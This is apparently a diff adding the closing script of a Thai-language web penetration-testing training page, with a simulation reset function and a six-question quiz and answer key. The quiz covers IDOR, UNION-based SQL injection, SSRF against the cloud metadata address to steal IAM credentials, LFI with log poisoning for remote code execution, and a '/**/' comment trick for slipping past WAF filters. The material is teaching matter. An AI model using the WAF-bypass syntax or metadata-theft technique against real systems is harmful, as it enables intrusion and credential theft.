+            const logNode = document.getElementById('n7-log');
+            const srvNode = document.getElementById('n7-server');
+            [client, logNode, srvNode].forEach(n => n.className = 'station-node');
+            document.getElementById('st7-log').innerText = 'Raw Text';
+            document.getElementById('st7-log').style.color = '';
+            document.getElementById('st7-server').innerText = 'Vulnerable';
+            document.getElementById('st7-server').style.color = '';
+            document.getElementById('pkt7').style.opacity = '0';
+            playSound('beep');
+            appendLog('term7', '🔄 Reset log file and server state. Ready for Step 1 poisoning.', 'normal');
+        }
+
+        // =================================================================
+        // QUIZ LOGIC
+        // =================================================================
+        const quizList = [
+            {
+                q: "1. ช่องโหว่ IDOR (Insecure Direct Object Reference) จัดอยู่ในหมวดหมู่ใดตาม OWASP Top 10?",
+                opts: [
+                    { t: "A01: Broken Access Control (การควบคุมสิทธิ์บกพร่อง)", c: true },
+                    { t: "A02: Cryptographic Failures", c: false },
+                    { t: "A09: Security Logging and Monitoring Failures", c: false }
+                ],
+                exp: "IDOR เกิดจากการที่เซิร์ฟเวอร์เชื่อพารามิเตอร์ ID ที่ส่งมาจากฝั่งไคลเอนต์โดยตรง โดยไม่มีการตรวจสอบสิทธิ์ว่าผู้ใช้รายนั้นมีอำนาจเข้าถึงข้อมูลดังกล่าวจริงหรือไม่ จึงจัดอยู่ใน A01: Broken Access Control"
+            },
+            {
+                q: "2. หากต้องการดึงข้อมูลตารางอื่นผ่าน SQL Injection แบบ In-Band จะต้องใช้ Operator SQL ใด?",
+                opts: [
+                    { t: "UNION SELECT (รวมผลลัพธ์ของ 2 Query เข้าด้วยกัน)", c: true },
+                    { t: "GROUP BY HAVING", c: false },
+                    { t: "DROP DATABASE", c: false }
+                ],
+                exp: "UNION SELECT ทำหน้าที่ผสานแถวผลลัพธ์จาก Query แรกเข้ากับผลลัพธ์ของ Query ที่สอง ช่วยให้นักเจาะระบบดึงข้อมูลจากตารางลับอื่นๆ เช่น users หรือ credentials ออกมาแสดงผลได้"
+            },
+            {
+                q: "3. การโจมตีแบบ SSRF (Server-Side Request Forgery) ส่งผลกระทบที่อันตรายที่สุดต่อ Cloud Environment อย่างไร?",
+                opts: [
+                    { t: "ดึง Cloud Instance Metadata (เช่น 169.254.169.254) เพื่อขโมย IAM Security Credentials", c: true },
+                    { t: "ทำให้จอคอมพิวเตอร์ดับ", c: false },
+                    { t: "เปลี่ยนภาษาในเบราว์เซอร์ของ Client", c: false }
+                ],
+                exp: "บน Cloud Services เช่น AWS/GCP/Azure ที่อยู่ 169.254.169.254 เก็บข้อมูล Instance Metadata รวมทั้ง Token/Secret ของ IAM Role ทำให้แฮกเกอร์ขโมยกุญแจ Cloud ไปควบคุมโครงสร้างระบบได้ทั้งหมด"
+            },
+            {
+                q: "4. เทคนิค 'LFI + Apache Log Poisoning' ส่งผลลัพธ์สูงสุดคืออะไร?",
+                opts: [
+                    { t: "RCE (Remote Code Execution) รันคำสั่งระดับ OS บนเซิร์ฟเวอร์เป้าหมาย", c: true },
+                    { t: "เปลี่ยนสีพื้นหลังหน้าเว็บ", c: false },
+                    { t: "ลบไฟล์รูปภาพในเครื่อง Client", c: false }
+                ],
+                exp: "เมื่อแฮกเกอร์ส่ง PHP Shell ใน User-Agent เข้าไปใน Log file แล้วใช้ LFI ดึง Log นั้นมารัน ตัว PHP Engine จะประมวลผลโค้ด Shell ทำให้แฮกเกอร์ได้ Remote Code Execution (RCE) ยึดเครื่องทันที"
+            },
+            {
+                q: "5. หากต้องการ Bypass การตรวจจับคำว่า 'SELECT' ของ WAF โดยใช้เทคนิค Inline Comment ควรเขียนอย่างไร?",
+                opts: [
+                    { t: "SELECT/**/column/**/FROM/**/table", c: true },
+                    { t: "SELECT -- column -- FROM", c: false },
+                    { t: "#SELECT#column#FROM", c: false }
+                ],
+                exp: "ในภาษา SQL ตัวอักษร /**/ คือ Inline Block Comment ซึ่ง RDBMS มองเป็นช่องว่างได้ แต่ WAF แบบ Simple Regex ที่ตรวจหาคำว่า 'SELECT<space>' จะตรวจจับไม่เจอ ทำให้ทะลุ WAF ได้"
+            },
+            {
+                q: "6. ข้อแตกต่างสำคัญระหว่าง Stored XSS กับ Reflected XSS คืออะไร?",
+                opts: [
+                    { t: "Stored ฝังคงอยู่บนเซิร์ฟเวอร์และทำร้ายทุกคนที่เข้าดู ส่วน Reflected ต้องหลอกเหยื่อคลิกลิงก์ทีละครั้ง", c: true },
+                    { t: "Stored ทำงานเฉพาะบน Chrome ส่วน Reflected ทำงานเฉพาะบน Firefox", c: false },
+                    { t: "ทั้งสองแบบเหมือนกันทุกประการ ไม่มีความแตกต่าง", c: false }
+                ],
+                exp: "Stored XSS เพย์โหลดจะถูกเก็บถาวรในฐานข้อมูล เช่น โพสต์หรือคอมเมนต์ ทำให้ผู้ใช้ทุกคนที่เปิดหน้านั้นโดนสคริปต์ทำงานใส่ทันที ขณะที่ Reflected XSS เพย์โหลดติดไปกับพารามิเตอร์ URL ต้องส่งลิงก์หลอกเหยื่อเป็นรายบุคคล"
+            }
+        ];
+
+        let curQ = 0;
+        let score = 0;
+
+        function loadQuiz() {
+            const quizBox = document.getElementById('quizBox');
+            if (curQ >= quizList.length) {
+                let badge = '🏆 ยอดเยี่ยม! ระดับเกียรตินิยม Web-RTA';
+                if (score < 4) badge = '💪 พยายามได้ดี! ลองทบทวนโมดูลจำลองแล้วทำใหม่อีกครั้ง';
+                else if (score < 6) badge = '🌟 เก่งมาก! เข้าใจหลักการทดสอบเจาะระบบเว็บอย่างดี';
+
+                quizBox.innerHTML = `
+                    <div style="padding: 28px; text-align: center; background: rgba(14, 21, 38, 0.95); border: 1px solid var(--border); border-radius: 14px;">
+                        <div style="font-size: 3.8rem; margin-bottom: 8px;">🎯</div>
+                        <h3 style="color: #34d399; font-size: 1.5rem; margin-bottom: 8px;">แบบทดสอบเสร็จสมบูรณ์!</h3>
+                        <p style="font-size: 1.1rem; color: #f8fafc; margin-bottom: 6px;">คะแนนของคุณ: <span style="color: var(--amber); font-weight:700; font-size: 1.5rem;">${score} / ${quizList.length}</span></p>
+                        <p style="color: var(--cyan); font-size: 0.95rem; font-weight: 600; margin-bottom: 12px;">${badge}</p>
+                        <p style="color: var(--text-sub); font-size:0.9rem; max-width: 500px; margin: 0 auto 20px auto;">คุณได้เรียนรู้ขั้นตอนการเดินทางและการตรวจจับ HTTP Packet ในการทดสอบเจาะระบบเว็บครบทั้ง 9 รูปแบบแล้ว!</p>
+                        <button class="btn-ctrl btn-success" style="margin: 0 auto;" onclick="restartQuiz()">🔄 ทำแบบทดสอบใหม่</button>
+                    </div>
+                `;
+                playSound('success');
+                return;
+            }
+
+            const item = quizList[curQ];
+            document.getElementById('quizProgress').innerText = `ข้อที่ ${curQ + 1} จากทั้งหมด ${quizList.length} ข้อ`;
+            document.getElementById('quizQuestionText').innerText = item.q;
+            
+            let html = '';
+            item.opts.forEach((opt, idx) => {
+                html += `<div class="quiz-opt-btn" id="qopt-${idx}" onclick="checkQuiz(this, ${opt.c}, ${idx})">${opt.t}</div>`;
+            });
+            document.getElementById('quizOptionsContainer').innerHTML = html;
+            const feedbackArea = document.getElementById('quizFeedbackArea');
+            feedbackArea.style.display = 'none';
+            feedbackArea.innerHTML = '';
+        }
+
+        function checkQuiz(el, isCorrect, chosenIdx) {
+            const item = quizList[curQ];
+            document.querySelectorAll('.quiz-opt-btn').forEach(o => o.style.pointerEvents = 'none');
+            
+            if (isCorrect) {
+                el.classList.add('correct');
+                playSound('success');
+                score++;
+            } else {
+                el.classList.add('wrong');
+                playSound('danger');
+                // Highlight correct option in green
+                item.opts.forEach((opt, idx) => {
+                    if (opt.c) {
+                        const correctEl = document.getElementById(`qopt-${idx}`);
+                        if (correctEl) correctEl.classList.add('show-correct');
+                    }
+                });
+            }
+
+            const feedbackArea = document.getElementById('quizFeedbackArea');
+            feedbackArea.style.display = 'block';
+            feedbackArea.innerHTML = `
+                <div class="quiz-explanation">
+                    <div style="font-weight: 600; color: ${isCorrect ? '#34d399' : '#f87171'}; margin-bottom: 4px;">
+                        ${isCorrect ? '✅ ตอบถูกต้อง!' : '❌ ยังไม่ถูกต้อง (ดูเฉลยและคำอธิบายด้านล่าง)'}
+                    </div>
+                    <div>💡 <strong>คำอธิบาย:</strong> ${item.exp}</div>
+                </div>
+                <div style="text-align: right; margin-top: 12px;">
+                    <button class="btn-ctrl btn-success" style="display: inline-flex;" onclick="nextQuestion()">
+                        ${curQ + 1 >= quizList.length ? 'ดูผลคะแนน 🏆' : 'ข้อถัดไป ➔'}
+                    </button>
+                </div>
+            `;
+        }
+
+        function nextQuestion() {
+            playSound('beep');
+            curQ++;
+            loadQuiz();
+        }
+
+        function restartQuiz() {
+            curQ = 0;
+            score = 0;
+            document.getElementById('quizBox').innerHTML = `
+                <div style="background: rgba(14, 21, 38, 0.9); border: 1px solid var(--border); border-radius: 12px; padding: 24px; max-width: 720px; margin: 0 auto; text-align: left;">
+                    <div id="quizProgress" class="quiz-progress"></div>
+                    <div id="quizQuestionText" style="font-size: 1.05rem; font-weight: 600; margin-bottom: 16px; color: var(--amber); line-height: 1.6;"></div>
+                    <div id="quizOptionsContainer"></div>
+                    <div id="quizFeedbackArea" style="display:none;"></div>
+                </div>
+            `;
+            loadQuiz();
+        }
+
+        loadQuiz();
+    </script>
+</body>
+</html>
